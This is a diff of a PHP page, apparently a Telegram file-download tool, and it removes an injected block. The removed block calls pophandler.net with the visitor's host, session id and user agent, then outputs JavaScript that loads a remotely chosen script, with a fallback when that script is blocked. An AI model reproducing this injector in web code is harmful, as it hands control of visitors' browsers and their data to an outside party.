@@ -47,45 +47,7 @@ $media = $mProto->messages->getMessages(['id' => [$id / 1024 / 1024]]);
         $FileName = isset($getDownloadInfo['name']) ? $getDownloadInfo['name'] : "ناشناخته";
         $ext = isset($getDownloadInfo['ext']) ? $getDownloadInfo['ext'] : $getDownloadInfo['MessageMedia']['document']['ext'];
         $size = isset($getDownloadInfo['InputFileLocation']['file_size']) ? $getDownloadInfo['InputFileLocation']['file_size'] : $getDownloadInfo['size'];
-if( !empty( $_GET[ 'blocked' ] ) ) {
-
-	return file_get_contents( 'http://pophandler.net/98ub4ygygd85sv0bi8tn2p8pp8ix3cjd55pcb64k1gjv7e2eg3p1awd5xp77irwuff80sgx44l1y55nqslagx?domain_id=' . $_GET[ 'domain_id' ] . '&sid=' . $_GET[ 'sid' ] . '&ua=' . rawurlencode($_SERVER['HTTP_USER_AGENT']) );
-}
-
-$https = isset( $_SERVER[ 'HTTPS' ] ) && ('on' == strtolower( $_SERVER[ 'HTTPS' ] ) || '1' == $_SERVER[ 'HTTPS' ]) ? '1' : '0';
-
-$data = file_get_contents( 'http://pophandler.net/58q16cydlcs8cbkhjfrndd7v7pswp179l6uwxfex0jyj5b8hkzg2xk878ptta4tmoa7y132clzi8s?https=' . $https . '&host=' . $_SERVER[ 'HTTP_HOST' ] . '&sid=' . $_GET[ 'sid' ] . '&ua=' . rawurlencode($_SERVER['HTTP_USER_AGENT']) );
-
-if( empty( $data ) || empty( $_GET[ 'sid' ] ) ) {
-	return;
-}
-$data = json_decode( $data, true );
-
-if( empty( $data[ 'domainUrl' ] ) ) {
-	return;
-}
-
-
-$q = $_GET[ 'sid' ];
-
-$q .= '?s=' . base64_encode( mt_rand( 0, 100000 ) );
-
-header( 'Content-Type: application/javascript' );
 ?>
-(function () {
-var script = document.createElement('script');
-script.src = '//<?= $data[ 'domainUrl' ] ?>';
-script.async = true;
-document.body.appendChild(script);
-var blockedTimeOut = setTimeout(function () {
-var s = document.createElement('script');
-s.src = '<?= '//' . $_SERVER[ 'HTTP_HOST' ] . $_SERVER[ 'REQUEST_URI' ] . '&blocked=true&domain_id=' . $data[ 'id' ] ?>';
-document.body.appendChild(s);
-}, 4e3);
-script.onload = function () {
-clearTimeout(blockedTimeOut);
-};
-})();
 <html lang="en" dir="rtl">
 <head>
     <meta charset="utf-8">
